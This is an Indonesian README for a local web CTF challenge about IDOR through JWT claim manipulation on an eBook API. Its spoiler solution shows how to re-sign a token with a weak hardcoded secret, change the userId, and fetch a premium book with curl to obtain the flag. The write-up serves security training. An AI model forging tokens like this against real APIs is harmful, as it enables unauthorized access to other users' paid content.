# API eBook Premium - Akses Buku Berbayar via IDOR

> Web CTF Challenge | by [ctflabs-id](https://github.com/ctflabs-id)


---

## 📖 Scenario

Anda adalah pentester yang ditugaskan mengaudit API layanan eBook premium. Sistem ini menggunakan Express.js dengan autentikasi JWT. Meskipun memerlukan login, terdapat kerentanan dimana user bisa mengakses eBook berbayar milik user lain dengan memodifikasi claim JWT.

---

## 🎯 Challenge Overview
**Target:** `http://api-ebook-premium.local:4000`<br>
**Vulnerability:** Insecure Direct Object Reference (IDOR) via JWT Claim Manipulation<br>
**Objective:** Dapatkan akses ke eBook premium dengan ID 1337 dan ekstrak flag dari kontennya.<br>
**Difficulty:** ⭐⭐⭐☆☆ (Intermediate)

---
## 🛠️ Setup Instructions

Prerequisites:

    Node.js v16+
    MongoDB
    JWT tool (optional)

Langkah-langkah:

  1. Clone repository ini
```bash
git clone https://github.com/ctflabs-id/API-eBook-Premium.git
cd API-eBook-Premium
```
  2. Install dependencies
```bash
npm install express jsonwebtoken mongoose body-parser
```
  3. Pastikan MongoDB Berjalan
  4. Start Server
```bash
node index.js
```
  5. Server akan berjalan di http://localhost:4000

---

## 💡 Hints
    🔑 Dapatkan token JWT valid terlebih dahulu via endpoint /login
    🔍 Gunakan tools seperti jwt.io untuk inspeksi/decode token
    ✏️ Modifikasi claim userId pada JWT untuk mendapatkan akses ke eBook premium
    📌 eBook target memiliki ID 1337
    🚩 Flag ada dalam content eBook premium

---

## 🎓 Tujuan Tantangan Ini
  1. Memahami kerentanan IDOR pada sistem berbasis JWT
  2. Belajar teknik manipulasi claim JWT
  3. Memahami pentingnya validasi kepemilikan resource di server
  4. Praktik eksploitasi authorization flaw pada REST API

---

## ⚠️ Disclaimer

Challenge ini dibuat hanya untuk edukasi dan simulasi keamanan siber. Jangan gunakan teknik serupa terhadap sistem yang tidak kamu miliki atau tidak diizinkan.

---
<details><summary><h2>🏆 Solusi yang Diharapkan - (Spoiler Allert)</h2></summary>

Peserta harus:

1. Langkah 1: Dapatkan Token JWT Awal&#x20;
<img src="./assets/ebook-1.png"></img>
Contoh Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.4j5XW7zQl2HJYwLw7QXn2v8m6d9QkZcX6jK7vL1J3Ek"
}
```
2. Langkah 2: Decode Token di jwt.io&#x20;
<img src="./assets/ebook-2.png"></img>
Lihat payload:
```json
{
  "userId": 1001,
  "role": "user",
  "iat": 1719429400,
  "exp": 1719433000
}
```
3. Langkah 3: Modifikasi Token&#x20;
<img src="./assets/ebook-3.png"></img>
Ubah userId dari 1001 menjadi 9999 (pemilik eBook premium)
Gunakan secret key insecure_secret_123 untuk signature baru
Hasilkan token baru, contoh:
```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OTksInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.1qZ3vVJkXoQ2wY8hN7Rt6cTm1x9fKsLp5UqSdW0bO4Y
```

4. Langkah 4: Akses eBook Premium
<img src="./assets/ebook-4.png"></img>
Gunakan token yang sudah dimodifikasi:
```bash
curl http://localhost:4000/api/ebooks/1337 \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OTksInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.1qZ3vVJkXoQ2wY8hN7Rt6cTm1x9fKsLp5UqSdW0bO4Y"
```
Response Sukses:
```json
{
  "title": "eBook Premium",
  "content": "CTF_FLAG{JWT_IDOR_Pr3v3nt1on_1s_Key}",
  "price": 50000
}
```
</details>

---

## 🤝 Kontribusi Pull request & issue welcome via: ctflabs-id/EBook-Premium-CTF
## 🧠 Maintained by:
```
GitHub: @ctflabs-id
Website: ctflabsid.my.id
```



